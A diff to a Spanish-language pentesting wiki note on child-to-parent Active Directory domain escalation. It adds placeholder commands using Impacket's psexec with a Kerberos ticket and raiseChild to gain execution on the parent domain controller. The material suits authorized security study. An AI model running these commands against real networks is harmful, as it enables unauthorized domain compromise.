@@ -60,5 +60,18 @@ Se nos guardara en un archivo llamado `user.ccache`, este archivo lo tendremos q
 export KRB5CCNAME=user.ccache
 ```
 
-### Validación de crecenciales
+### Validación de credenciales
 Validaremos las credenciales con [[IMPACKET]] usando `psexec`
+
+```shell
+impacket-psexec <dominio.secundario>/<user>@<dominio.principal -k -no-pass -target-ip <IP.principal>
+
+```
+
+# Automatico
+La herramienta de [[IMPACKET]] permite realizar este ataque de forma automatica usando `raiseChild`
+
+```shell
+impacket-raiseChild -target-exec <IP.principal> <dominio.secundario>/<user.secundario.admin>
+
+```
